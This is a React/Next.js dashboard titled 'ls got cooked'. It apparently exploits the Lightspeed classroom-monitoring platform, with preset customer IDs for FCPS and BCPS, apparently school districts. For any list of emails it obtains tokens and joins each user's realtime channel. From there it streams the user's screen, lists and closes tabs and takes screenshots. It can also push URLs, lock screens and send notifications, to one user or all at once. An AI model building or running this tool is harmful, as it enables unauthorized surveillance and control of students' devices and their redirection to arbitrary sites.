'use client';

import { useState, useRef, useEffect } from 'react';
import { Focus } from 'lucide-react'
import Ably from 'ably';
import md5 from './md5'

export default function HomePage() {
  const [emailsInput, setEmailsInput] = useState('');
  const [cId, setCId] = useState('');
  const [loading, setLoading] = useState(false);
  const [rtcActive, setRtcActive] = useState(false);
  const [emails, setEmails] = useState([]);
  const [sessions, setSessions] = useState({});
  const [selectedEmail, setSelectedEmail] = useState(null);
  const [lockInterval, setLockInterval] = useState(null);
  const [connectingEmail, setConnectingEmail] = useState(null);

  // Mass action states
  const [massUrl, setMassUrl] = useState('');
  const [massLockMessage, setMassLockMessage] = useState('');
  const [massNotification, setMassNotification] = useState('');
  const [massAgentUrl, setMassAgentUrl] = useState('');
  const [massActionProgress, setMassActionProgress] = useState(null); // { current: 0, total: 0, action: '' }

  const videoRef = useRef(null);
  const ablyConnectionsRef = useRef({}); // Store multiple Ably connections
  const jwtCacheRef = useRef({}); // Cache JWTs to avoid refetching

  const handleViewClick = async () => {
    const emails = emailsInput.split(',').map(e => e.trim()).filter(e => e);

    if (emails.length === 0 || !cId) {
      alert('Please enter at least one email and Customer ID');
      return;
    }

    setEmails(emails);
    setRtcActive(true);
    setSelectedEmail(emails[0]);
    connectToEmail(emails[0]);
  };

  const handleReset = () => {
    Object.values(sessions).forEach(session => {
      if (session.pc) {
        session.pc.close();
      }
    });

    // Close all Ably connections
    Object.values(ablyConnectionsRef.current).forEach(ably => {
      if (ably) {
        ably.close();
      }
    });
    ablyConnectionsRef.current = {};
    channelsRef.current = {};
    jwtCacheRef.current = {};

    if (lockInterval) {
      clearInterval(lockInterval);
      setLockInterval(null);
    }

    setSessions({});
    setSelectedEmail(null);
    setRtcActive(false);
    setLoading(false);
    setEmailsInput('');
    setCId('');
    setEmails([]);
    setMassUrl('');
    setMassLockMessage('');
    setMassNotification('');
    setConnectingEmail(null);
    setMassActionProgress(null);

    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
  };

  // Store channels in a ref for immediate access in mass actions
  const channelsRef = useRef({});
  const submitActivityAll = async () => {
    const total = emails.length;
    setMassActionProgress({
      current: 0,
      total,
      action: 'Submitting activity',
    });

    for (let i = 0; i < emails.length; i++) {
      const email = emails[i];

      setMassActionProgress({
        current: i + 1,
        total,
        action: `Submitting for ${email}`,
      });

      try {
        const res = await fetch('/api/catcher', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            userId: md5(String(email).trim().toLowerCase()),
            cId,
            agentURL: massAgentUrl,
          }),
        });

        if (!res.ok) {
          console.warn(`[activity] failed for ${email}`);
        }
      } catch (err) {
        console.error(`[activity] error for ${email}`, err);
      }
    }

    setMassActionProgress(null);
  };
  // Mass action functions - connect sequentially with progress, use cached JWT
  const sendUrlToAll = async () => {
    const total = emails.length;
    setMassActionProgress({ current: 0, total, action: 'Sending URL' });

    for (let i = 0; i < emails.length; i++) {
      const email = emails[i];
      setMassActionProgress({ current: i + 1, total, action: `Sending URL to ${email}` });

      // Connect if not already connected
      if (!channelsRef.current[email]) {
        await connectToEmail(email);
      }

      if (channelsRef.current[email]) {
        channelsRef.current[email].publish('url', massUrl);
      }
    }

    setMassActionProgress(null);
  };

  const lockAll = async () => {
    const total = emails.length;
    setMassActionProgress({ current: 0, total, action: 'Locking' });

    for (let i = 0; i < emails.length; i++) {
      const email = emails[i];
      setMassActionProgress({ current: i + 1, total, action: `Locking ${email}` });

      if (!channelsRef.current[email]) {
        await connectToEmail(email);
      }

      if (channelsRef.current[email]) {
        channelsRef.current[email].publish('lock', {
          type: 'lock',
          lockMessage: massLockMessage,
        });
      }
    }

    setMassActionProgress(null);
  };

  const unlockAll = async () => {
    if (lockInterval) {
      clearInterval(lockInterval);
      setLockInterval(null);
    }

    const total = emails.length;
    setMassActionProgress({ current: 0, total, action: 'Unlocking' });

    for (let i = 0; i < emails.length; i++) {
      const email = emails[i];
      setMassActionProgress({ current: i + 1, total, action: `Unlocking ${email}` });

      if (!channelsRef.current[email]) {
        await connectToEmail(email);
      }

      if (channelsRef.current[email]) {
        channelsRef.current[email].publish('unlock');
      }
    }

    setMassActionProgress(null);
  };

  const notifyAll = async () => {
    const total = emails.length;
    setMassActionProgress({ current: 0, total, action: 'Sending notification' });

    for (let i = 0; i < emails.length; i++) {
      const email = emails[i];
      setMassActionProgress({ current: i + 1, total, action: `Notifying ${email}` });

      if (!channelsRef.current[email]) {
        await connectToEmail(email);
      }

      if (channelsRef.current[email]) {
        channelsRef.current[email].publish('tm', {
          mId: null,
          m: massNotification,
        });
      }
    }

    setMassActionProgress(null);
  };

  // Connect to a single email (lazy load on click)
  const connectToEmail = async (email) => {
    if (channelsRef.current[email]) {
      setSelectedEmail(email);
      return;
    }

    setConnectingEmail(email);
    setSelectedEmail(email);

    try {
      const sessId = crypto.randomUUID();

      // Use cached JWT if available
      let token = jwtCacheRef.current[email];
      if (!token) {
        const res = await fetch('/api/jwt', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, cId })
        });
        token = await res.text();
        jwtCacheRef.current[email] = token;
      }

      const ably = new Ably.Realtime({
        token,
        clientId: email,
        autoConnect: true,
        echoMessages: false,
        endpoint: "lightspeed",
        fallbackHosts: ["a-fallback-lightspeed.ably.io", "b-fallback-lightspeed.ably.io", "c-fallback-lightspeed.ably.io"]
      });

      ablyConnectionsRef.current[email] = ably;

      const channel = ably.channels.get(`${cId}:${email}`);
      channelsRef.current[email] = channel;

      const newSession = {
        tabsList: [],
        channel,
        ably,
        pc: null,
        videoStream: null,
        lockMessage: '',
        notification: '',
        url: ''
      };

      setSessions(prev => ({ ...prev, [email]: newSession }));

      // Subscribe to tabs
      channel.subscribe('tabs', (msg) => {
        const tabsData = msg.data;
        setSessions(prev => ({
          ...prev,
          [email]: {
            ...prev[email],
            tabsList: tabsData
          }
        }));
      });

      // Request tabs first
      channel.publish('presence', { viewingTabs: true });

      // Wait a tick so tabs can arrive before clearing
      await new Promise(res => setTimeout(res, 50));

      // Now request RTC without wiping tabs
      channel.publish('request_rtc', {
        sessionId: sessId,
        role: 'viewer',
        want: ['video']
      });

      // RTC setup
      const pc = new RTCPeerConnection();
      const pendingIce = [];

      pc.ontrack = (event) => {
        setSessions(prev => ({
          ...prev,
          [email]: {
            ...prev[email],
            videoStream: event.streams[0]
          }
        }));
      };

      pc.onicecandidate = (event) => {
        if (event.candidate?.candidate) {
          channel.publish('answer_rtc_ice', {
            sessionId: sessId,
            ice: event.candidate
          });
        }
      };

      channel.subscribe(async (msg) => {
        if (msg.name === 'offer_rtc' && msg.data.sessionId === sessId) {
          await pc.setRemoteDescription({ type: 'offer', sdp: msg.data.offer.sdp });
          for (const ice of pendingIce) await pc.addIceCandidate(ice);
          pendingIce.length = 0;

          const answer = await pc.createAnswer();
          await pc.setLocalDescription(answer);
          channel.publish('answer_rtc', { sessionId: sessId, answer });
        }

        if (msg.name === 'offer_rtc_ice' && msg.data.sessionId === sessId) {
          const ice = msg.data.ice;
          if (!ice?.candidate) return;
          if (pc.remoteDescription) await pc.addIceCandidate(ice);
          else pendingIce.push(ice);
        }
      });

      setSessions(prev => ({
        ...prev,
        [email]: { ...prev[email], pc }
      }));

      setConnectingEmail(null);
    } catch (err) {
      console.error('Error connecting to email:', err);
      setConnectingEmail(null);
    }
  };


  useEffect(() => {
    if (selectedEmail && sessions[selectedEmail]?.videoStream && videoRef.current) {
      videoRef.current.srcObject = sessions[selectedEmail].videoStream;
    }
  }, [selectedEmail, sessions]);

  const updateSessionField = (email, field, value) => {
    setSessions(prev => ({
      ...prev,
      [email]: {
        ...prev[email],
        [field]: value
      }
    }));
  };

  const currentSession = selectedEmail ? sessions[selectedEmail] : null;

  // Login screen
  if (!rtcActive) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-zinc-50 font-sans dark:bg-black p-8">
        <main className="w-full max-w-md space-y-6 bg-white dark:bg-gray-900 p-8 rounded-xl shadow-lg">
          <h1 className="text-2xl font-bold text-center">ls got cooked</h1>

          <textarea
            placeholder="Enter emails (comma-separated)"
            value={emailsInput}
            onChange={(e) => setEmailsInput(e.target.value)}
            rows={3}
            className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring focus:ring-blue-400 dark:bg-gray-800 dark:text-white"
          />
          <p className="text-sm text-gray-500 dark:text-gray-400">
            Enter multiple emails separated by commas
          </p>

          <div className="flex items-center space-x-2">
            <input
              type="text"
              placeholder="Customer ID"
              value={cId}
              onChange={(e) => setCId(e.target.value)}
              className="flex-1 px-3 py-2 border rounded-md focus:outline-none focus:ring focus:ring-blue-400 dark:bg-gray-800 dark:text-white"
            />
            <button
              type="button"
              onClick={() => setCId('61-6373-A000')}
              className="px-3 py-2 bg-blue-500 text-white rounded-md hover:bg-blue-600"
            >
              FCPS
            </button>
            <button
              type="button"
              onClick={() => setCId('62-5055-A000')}
              className="px-3 py-2 bg-blue-500 text-white rounded-md hover:bg-blue-600"
            >
              BCPS
            </button>
          </div>

          <button
            onClick={handleViewClick}
            disabled={loading}
            className="w-full bg-green-500 hover:bg-green-600 text-white py-2 rounded-md"
          >
            {loading ? 'Loading...' : 'View'}
          </button>
        </main>
      </div>
    );
  }

  // Main dashboard with sidebar
  return (
    <div className="flex h-screen bg-zinc-100 dark:bg-black font-sans">
      {/* Sidebar */}
      <aside className="w-72 bg-gray-900 text-white flex flex-col h-full">
        {/* Header */}
        <div className="p-4 border-b border-gray-700">
          <h1 className="text-xl font-bold">ls got cooked</h1>
          <p className="text-xs text-gray-400 mt-1">{emails.length} users • {Object.keys(sessions).filter(e => sessions[e]?.channel).length} connected</p>
        </div>

        {/* User list */}
        <div className="flex-1 overflow-y-auto">
          <div className="p-2">
            <h2 className="text-xs uppercase text-gray-500 font-semibold px-2 py-2">Users</h2>
            {emails.map((email) => (
              <button
                key={email}
                onClick={() => connectToEmail(email)}
                className={`w-full text-left px-3 py-2 rounded-md text-sm mb-1 transition-colors ${
                  selectedEmail === email
                    ? 'bg-blue-600 text-white'
                    : 'text-gray-300 hover:bg-gray-800'
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="truncate">{email}</span>
                  {connectingEmail === email && (
                    <span className="text-xs text-yellow-400">connecting...</span>
                  )}
                  {sessions[email]?.channel && connectingEmail !== email && (
                    <span className="text-xs text-green-400">●</span>
                  )}
                </div>
                <div className="text-xs text-gray-400">
                  {sessions[email]?.tabsList?.length || 0} tabs
                </div>
              </button>
            ))}
          </div>
        </div>

        {/* Mass Actions */}
        <div className="border-t border-gray-700 p-4 space-y-3">
          <h2 className="text-xs uppercase text-gray-500 font-semibold">Mass Actions</h2>

          {/* Mass URL */}
          <div className="space-y-1">
            <input
              type="text"
              placeholder="URL for all"
              value={massUrl}
              onChange={(e) => setMassUrl(e.target.value)}
              className="w-full px-2 py-1 text-sm bg-gray-800 border border-gray-700 rounded text-white placeholder-gray-500"
            />
            <button
              onClick={sendUrlToAll}
              className="w-full px-2 py-1 text-xs bg-blue-600 hover:bg-blue-700 rounded"
            >
              Send URL to All
            </button>
          </div>

          {/* Mass Lock */}
          <div className="space-y-1">
            <input
              type="text"
              placeholder="Lock message for all"
              value={massLockMessage}
              onChange={(e) => setMassLockMessage(e.target.value)}
              className="w-full px-2 py-1 text-sm bg-gray-800 border border-gray-700 rounded text-white placeholder-gray-500"
            />
            <div className="flex space-x-1">
              <button
                onClick={lockAll}
                className="flex-1 px-2 py-1 text-xs bg-red-600 hover:bg-red-700 rounded"
              >
                Lock All
              </button>
              <button
                onClick={unlockAll}
                className="flex-1 px-2 py-1 text-xs bg-green-600 hover:bg-green-700 rounded"
              >
                Unlock All
              </button>
            </div>
          </div>

          {/* Mass Notification */}
          <div className="space-y-1">
            <input
              type="text"
              placeholder="Notification for all"
              value={massNotification}
              onChange={(e) => setMassNotification(e.target.value)}
              className="w-full px-2 py-1 text-sm bg-gray-800 border border-gray-700 rounded text-white placeholder-gray-500"
            />
            <button
              onClick={notifyAll}
              className="w-full px-2 py-1 text-xs bg-purple-600 hover:bg-purple-700 rounded"
            >
              Notify All
            </button>
          </div>

          <div className="space-y-1">
            <input
              type="text"
              placeholder="URL for all LS agents"
              value={massAgentUrl}
              onChange={(e) => setMassAgentUrl(e.target.value)}
              className="w-full px-2 py-1 text-sm bg-gray-800 border border-gray-700 rounded text-white placeholder-gray-500"
            />
            <button
              onClick={submitActivityAll}
              className="w-full px-2 py-1 text-xs bg-blue-600 hover:bg-blue-700 rounded"
            >
              Send URL to All LS Agents
            </button>
          </div>

          {/* Progress indicator */}
          {massActionProgress && (
            <div className="mt-3 p-2 bg-gray-800 rounded">
              <div className="text-xs text-gray-300 mb-1">
                {massActionProgress.action}
              </div>
              <div className="w-full bg-gray-700 rounded-full h-2">
                <div
                  className="bg-blue-500 h-2 rounded-full transition-all duration-200"
                  style={{ width: `${(massActionProgress.current / massActionProgress.total) * 100}%` }}
                />
              </div>
              <div className="text-xs text-gray-400 mt-1 text-right">
                {massActionProgress.current} / {massActionProgress.total}
              </div>
            </div>
          )}
        </div>

        {/* Reset button */}
        <div className="p-4 border-t border-gray-700">
          <button
            onClick={handleReset}
            className="w-full bg-red-500 hover:bg-red-600 text-white py-2 rounded-md text-sm"
          >
            ← Reset / Back to Home
          </button>
        </div>
      </aside>

      {/* Main content */}
      <main className="flex-1 flex flex-col overflow-hidden">
        {selectedEmail && currentSession ? (
          <>
            {/* Top bar */}
            <div className="bg-white dark:bg-gray-900 border-b dark:border-gray-700 px-6 py-3 flex items-center justify-between">
              <div>
                <h2 className="text-lg font-semibold dark:text-white">{selectedEmail}</h2>
                <p className="text-sm text-gray-500">{currentSession.tabsList?.length || 0} open tabs</p>
              </div>
              <button
                onClick={() => {
                  if (!videoRef.current) return;
                  const video = videoRef.current;
                  const
 canvas = document.createElement('canvas');
                  canvas.width = video.videoWidth;
                  canvas.height = video.videoHeight;
                  const ctx = canvas.getContext('2d');
                  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                  const dataUrl = canvas.toDataURL('image/png');
                  const link = document.createElement('a');
                  link.href = dataUrl;
                  link.download = `screenshot-${selectedEmail}.png`;
                  document.body.appendChild(link);
                  link.click();
                  document.body.removeChild(link);
                }}
                className="px-4 py-2 bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-white rounded-md hover:bg-gray-300 dark:hover:bg-gray-600 text-sm"
              >
                📸 Screenshot
              </button>
            </div>

            {/* Content area */}
            <div className="flex-1 flex overflow-hidden">
              {/* Video panel */}
              <div className="flex-1 p-4 bg-zinc-100 dark:bg-zinc-950">
                <div className="w-full h-full bg-black rounded-lg overflow-hidden translate-z-0 will-change-transform backface-hidden">
                  <video
                    ref={videoRef}
                    autoPlay
                    playsInline
                    className="w-full h-full object-contain"
                  />
                </div>
              </div>

              {/* Right panel - Controls & Tabs */}
              <div className="w-80 bg-white dark:bg-gray-900 border-l dark:border-gray-700 flex flex-col overflow-hidden">
                {/* Individual controls */}
                <div className="p-4 border-b dark:border-gray-700 space-y-3">
                  <h3 className="font-semibold text-sm dark:text-white">Individual Controls</h3>

                  {/* Send URL */}
                  <div className="space-y-1">
                    <label className="text-xs text-gray-500">Send URL</label>
                    <div className="flex space-x-1">
                      <input
                        type="text"
                        placeholder="Enter URL"
                        value={currentSession.url}
                        onChange={(e) => updateSessionField(selectedEmail, 'url', e.target.value)}
                        className="flex-1 px-2 py-1 text-sm border rounded dark:bg-gray-800 dark:border-gray-700 dark:text-white"
                      />
                      <button
                        onClick={() => {
                          if (!currentSession.channel) return;
                          currentSession.channel.publish('url', currentSession.url);
                        }}
                        className="px-3 py-1 text-sm bg-blue-500 text-white rounded hover:bg-blue-600"
                      >
                        Send
                      </button>
                    </div>
                  </div>

                  {/* Lock/Unlock */}
                  <div className="space-y-1">
                    <label className="text-xs text-gray-500">Lock / Unlock</label>
                    <input
                      type="text"
                      placeholder="Lock message"
                      value={currentSession.lockMessage}
                      onChange={(e) => updateSessionField(selectedEmail, 'lockMessage', e.target.value)}
                      className="w-full px-2 py-1 text-sm border rounded dark:bg-gray-800 dark:border-gray-700 dark:text-white"
                    />
                    <div className="flex space-x-1">
                      <button
                        onClick={() => {
                          if (!currentSession.channel) return;
                          currentSession.channel.publish('lock', {
                            type: 'lock',
                            lockMessage: currentSession.lockMessage,
                          });
                        }}
                        className="flex-1 px-2 py-1 text-sm bg-red-500 text-white rounded hover:bg-red-600"
                      >
                        Lock
                      </button>
                      <button
                        onClick={() => {
                          if (!currentSession.channel) return;
                          currentSession.channel.publish('unlock');
                        }}
                        className="flex-1 px-2 py-1 text-sm bg-green-500 text-white rounded hover:bg-green-600"
                      >
                        Unlock
                      </button>
                    </div>
                  </div>

                  {/* Notification */}
                  <div className="space-y-1">
                    <label className="text-xs text-gray-500">Send Notification</label>
                    <div className="flex space-x-1">
                      <input
                        type="text"
                        placeholder="Message"
                        value={currentSession.notification}
                        onChange={(e) => updateSessionField(selectedEmail, 'notification', e.target.value)}
                        className="flex-1 px-2 py-1 text-sm border rounded dark:bg-gray-800 dark:border-gray-700 dark:text-white"
                      />
                      <button
                        onClick={() => {
                          if (!currentSession.channel) return;
                          currentSession.channel.publish('tm', {
                            mId: null,
                            m: currentSession.notification,
                          });
                        }}
                        className="px-3 py-1 text-sm bg-purple-500 text-white rounded hover:bg-purple-600"
                      >
                        Send
                      </button>
                    </div>
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs text-gray-500">Send URL to LS Agent</label>
                    <div className="flex space-x-1">
                      <input
                        type="text"
                        placeholder="Enter URL"
                        value={currentSession.agentURL}
                        onChange={(e) => updateSessionField(selectedEmail, 'agentURL', e.target.value)}
                        className="flex-1 px-2 py-1 text-sm border rounded dark:bg-gray-800 dark:border-gray-700 dark:text-white"
                      />
                      <button
                        onClick={async () => {
                          const res = await fetch('/api/catcher', {
                            method: 'POST',
                            headers: {
                              'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                              userId: md5(String(selectedEmail).trim().toLowerCase()),
                              cId,
                              agentURL: currentSession.agentURL,
                            }),
                          })
                          console.log(await res.json())
                        }}
                        className="px-3 py-1 text-sm bg-blue-500 text-white rounded hover:bg-blue-600"
                      >
                        Send
                      </button>
                    </div>
                  </div>
                </div>



                {/* Tabs list */}
                <div className="flex-1 overflow-y-auto p-4">
                  <h3 className="font-semibold text-sm dark:text-white mb-2">Open Tabs</h3>
                  {currentSession.tabsList.length === 0 ? (
                    <p className="text-sm text-gray-500">No tabs yet</p>
                  ) : (
                    <ul className="space-y-2">
                      {currentSession.tabsList.map((tab) => (
                        <li
                          key={tab.id}
                          className="bg-gray-100 dark:bg-gray-800 p-2 rounded text-sm group"
                        >
                          <div className="flex justify-between gap-x-3 items-start">
                            <div className="flex-1 min-w-0 pr-2">
                              <div className="font-medium dark:text-white truncate">{tab.title}</div>
                              <div className="text-xs text-gray-500 truncate">{tab.url}</div>
                            </div>
                            <button
                              onClick={() => {
                                if (!currentSession.channel) return;
                                currentSession.channel.publish('focusTab', {
                                  tabId: tab.id,
                                  windowId: tab.window_id
                                });
                              }}
                              className="text-red-500 hover:text-red-700 font-bold opacity-0 group-hover:opacity-100 transition-opacity"
                            >
                              <Focus size={20} />
                            </button>
                            <button
                              onClick={() => {
                                if (!currentSession.channel) return;
                                currentSession.channel.publish('closeTab', {
                                  tabId: tab.id,
                                  url: tab.url
                                });
                              }}
                              className="text-red-500 hover:text-red-700 font-bold opacity-0 group-hover:opacity-100 transition-opacity"
                            >
                              ×
                            </button>
                          </div>
                        </li>
                      ))}
                    </ul>
                  )}
                </div>
              </div>
            </div>
          </>
        ) : (
          <div className="flex-1 flex items-center justify-center text-gray-500">
            <p>Select a user from the sidebar to start monitoring</p>
          </div>
        )}
      </main>
    </div>
  );
}
